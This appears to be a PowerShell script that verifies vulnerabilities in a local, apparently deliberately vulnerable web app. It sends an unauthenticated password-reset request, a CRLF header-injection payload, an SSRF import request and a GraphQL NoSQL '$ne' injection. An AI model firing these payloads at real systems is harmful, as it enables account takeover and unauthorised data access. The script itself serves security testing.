$baseUrl = "http://localhost:80"

# 1. Login to get token
$loginUrl = "$baseUrl/api/v2/login"
$body = @{
    username = "admin"
    password = "letmein"
} | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri $loginUrl -Method Post -Body $body -ContentType "application/json"
    $token = $response.token
    Write-Host "[+] Login Successful. Token obtained."
}
catch {
    Write-Host "[-] Login Failed: $_"
    exit 1
}

# 2. Verify CSRF / Unauthenticated Password Change
$csrfUrl = "$baseUrl/api/v2/users/password"
$csrfBody = @{
    username    = "admin"
    newPassword = "hacked123"
} | ConvertTo-Json

try {
    # Attempt without any auth headers
    $response = Invoke-RestMethod -Uri $csrfUrl -Method Post -Body $csrfBody -ContentType "application/json"
    Write-Host "[+] CSRF Vulnerability Verified: Password changed without auth/CSRF token."
}
catch {
    Write-Host "[-] CSRF Verification Failed: $_"
}

# 3. Verify CRLF Injection
# Note: Invoke-RestMethod might not show headers easily in exception, but we check if it doesn't error out on 500
$crlfPayload = "dark%0d%0aSet-Cookie:hacked=true"
$crlfUrl = "$baseUrl/api/v2/preference?theme=$crlfPayload"

try {
    $response = Invoke-WebRequest -Uri $crlfUrl -Method Get
    if ($response.Headers["X-User-Preference"] -match "dark") {
        Write-Host "[+] CRLF Endpoint Reachable."
        # verifying the actual CRLF injection usually requires inspecting raw response which Invoke-WebRequest hides
        Write-Host "    (Manual check required to see multiple headers)"
    }
}
catch {
    Write-Host "[-] CRLF Verification Failed: $_"
}

# 4. Verify SSRF (Webhook)
$ssrfUrl = "$baseUrl/api/v2/notes/import"
$ssrfBody = @{
    url = "https://www.google.com"
} | ConvertTo-Json

$headers = @{
    Authorization = "Bearer $token"
}

try {
    $response = Invoke-RestMethod -Uri $ssrfUrl -Method Post -Body $ssrfBody -ContentType "application/json" -Headers $headers
    if ($response.status -eq 200) {
        Write-Host "[+] SSRF Verified: Successfully fetched external URL."
    }
}
catch {
    Write-Host "[-] SSRF Verification Failed: $_"
}

# 5. Verify GraphQL NoSQL Injection
$graphqlUrl = "http://localhost:4000/graphql"
# Query exploiting NoSQL injection to find all users where username is not null
$graphqlQuery = @{
    query = 'query { unsafeSearch(filter: "{\"username\": {\"$ne\": null}}") { username } }'
} | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri $graphqlUrl -Method Post -Body $graphqlQuery -ContentType "application/json"
    if ($response.data.unsafeSearch.username -contains "admin") {
        Write-Host "[+] GraphQL NoSQL Injection Verified: Found admin user via injection."
    }
}
catch {
    Write-Host "[-] GraphQL Verification Failed: $_"
}
